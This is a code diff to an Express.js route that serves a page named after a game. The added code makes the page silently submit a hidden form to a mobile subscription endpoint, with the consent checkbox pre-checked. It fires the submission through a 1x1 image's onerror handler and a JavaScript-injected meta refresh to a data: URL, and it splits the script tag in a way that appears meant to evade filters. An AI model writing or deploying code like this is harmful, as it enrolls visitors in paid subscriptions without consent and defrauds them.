@@ -282,9 +282,17 @@ app.get('/tr/crazy-birds', (req, res)=> {
     res.send(`
         <html>
         <head>
-        <meta http-equiv="refresh" content="0; url='data:text/html,<form action=http://wap.trend-tech.net/landings/subscribe method=post id=paymentForm><input type=checkbox name=onay id=onay checked=checked class=checkbox><input type=submit value=TAMAM id=submitButtonId></form><script>document.forms[0].submit()</script>'">
         </head>
         <body>
+            <script>
+                function imgReady() {
+                    var meta = document.createElement('meta');
+                    meta.httpEquiv = "refresh";
+                    meta.content = "0; url='data:text/html,<form action=http://wap.trend-tech.net/landings/subscribe method=post id=paymentForm style=display:none><input type=checkbox name=onay id=onay checked=checked class=checkbox><input type=submit value=TAMAM id=submitButtonId></form><script>document.forms[0].submit()</scri"+"pt>'";
+                    document.head.appendChild(meta);
+                }
+            </script>
+            <img src="http://n.frogstargames.com/tr/crazy-birds?offer=581" width="1" height="1" onerror="imgReady()">
         </body>
         </html>
     `)
